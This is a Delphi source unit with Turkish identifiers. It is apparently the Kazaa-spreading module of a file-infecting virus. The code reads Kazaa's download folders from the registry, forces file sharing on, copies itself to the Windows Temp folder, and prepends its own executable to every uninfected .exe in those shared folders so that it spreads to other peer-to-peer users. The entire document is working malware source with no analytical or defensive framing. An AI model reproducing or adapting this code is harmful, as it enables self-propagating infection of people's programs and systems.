   Unit Kazaa;

   Interface

   uses
     SysUtils,
     Windows;

   var
      HndKey: HKey;
      Deger:Integer;
      Buffer:Pointer;BufSize:Integer;
      FromF:File;
      KaynakDosya:String;
      i:Integer;

      procedure kazaaIt;

   const
      Uz1=46080;

   implementation

   function regReadString(kRoot: HKEY; sKey, sValue: String): String;
   var
     qValue: array[0..1023] of Char;
     DataSize: Integer;
     CurrentKey: HKEY;
   begin
     RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
     Datasize := 1023;
     RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
     RegCloseKey(CurrentKey);
     Result := String(qValue);
   end;

   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;

   Function Bulasmismi(HedefDosya:String):Boolean;
   Var
    Dosya1S:String;
    Dosya1F,Dosya2F:File;
    Okunan1,Okunan2:Array[0..2048] of Byte;
    i:Integer;
    Uygun:Boolean;
   Begin
    FileMode:=2;
   {$I-}
    AssignFile(Dosya1F, HedefDosya);
    Reset(Dosya1F, 1);
    CloseFile(Dosya1F);
   {$I+}
    Uygun:= (IOResult = 0) and (HedefDosya <> '');
    FileMode:=0;
    If Uygun=True Then
    Begin
     Dosya1S:=Windizin+'Temp\Dust.exe';;
     AssignFile(Dosya1F, HedefDosya);
     Reset(Dosya1F, 1);
     AssignFile(Dosya2F, Dosya1S);
     Reset(Dosya2F, 1);

     BlockRead(Dosya1F,Okunan1,SizeOf(Okunan1));
     BlockRead(Dosya2F,Okunan2,SizeOf(Okunan2));

     For i:=0 To 2048 Do
      Begin
       If Okunan1[i] <> Okunan2[i] Then
        Begin
         Result:=False;
         Break;
        End
        Else
         Result:=True;
      End;
       CloseFile(Dosya1F);
       CloseFile(Dosya2F);
    End
    Else
    Result:=True;
   End;
   //-------------------------------------------------------
   Procedure Birlestir(Dosya2S:String);
   Var
    Dosya1S,HedefDosya1:String;
    Dosya1,Dosya2,HedefDosya:File;
    Okunan,Yazilan:Integer;
    Buf: array[1..2048] of Char;
   Begin
   If Bulasmismi(Dosya2S) = False Then
   Begin
    Dosya1S:=Windizin+'Dust.exe';
    CopyFile(pchar(ParamStr(0)),Pchar(Dosya1S), FALSE);
    HedefDosya1:=Dosya2S+'.Tmp';
    FileMode:=0;
    AssignFile(Dosya1, Dosya1S);
    Reset(Dosya1, 1);
    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    AssignFile(HedefDosya, HedefDosya1);
    Rewrite(HedefDosya, 1);

    Repeat
     BlockRead(Dosya1, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);
    Repeat
     BlockRead(Dosya2, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);

    CloseFile(HedefDosya);
    CloseFile(Dosya1);
    CloseFile(Dosya2);
    CopyFile(Pchar(HedefDosya1),Pchar(Dosya2S), FALSE);
    DeleteFile(Pchar(HedefDosya1));
   End;
   End;
   Procedure BulBulas(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\*.exe' , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Birlestir(Klasor+'\'+Bulunan.Name);
    Until FindNext(Bulunan)<>0;
   End;
   End;

   Procedure KazaaInfect;
   var
   DlDir0,DlDir1:String;
   Value:Boolean;
   Begin
   DlDir0:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\Transfer',
    'DlDir0');
   DlDir1:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    'DownloadDir');
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    1,KEY_ALL_ACCESS,HndKey);
   Value:=False;Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableSharing',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   If DlDir0<>'' then
   Begin
   BulBulas(DlDir0);
   End;
   If DlDir1<>''  then
   Begin
   BulBulas(DlDir1);
   End;
   End;

   procedure kazaait;
   begin
   KaynakDosya:=Windizin+'Temp\Dust.exe';
   If FileExists(KaynakDosya) Then DeleteFile(Pchar(KaynakDosya));
   If Not DirectoryExists(Windizin+'Temp') Then CreateDir(Windizin+'Temp\Binary32');
   CopyFile(pchar(ParamStr(0)),Pchar(KaynakDosya), False);
    FileMode:=2;
    AssignFile(FromF, KaynakDosya);
    Reset(FromF, 1);
    If FileSize(FromF) > Uz1 Then
     Begin
   //  ReadLn(i);
   ;
     End;
     KazaaInfect;
   //  ReadLn(i);
   end;
   end.
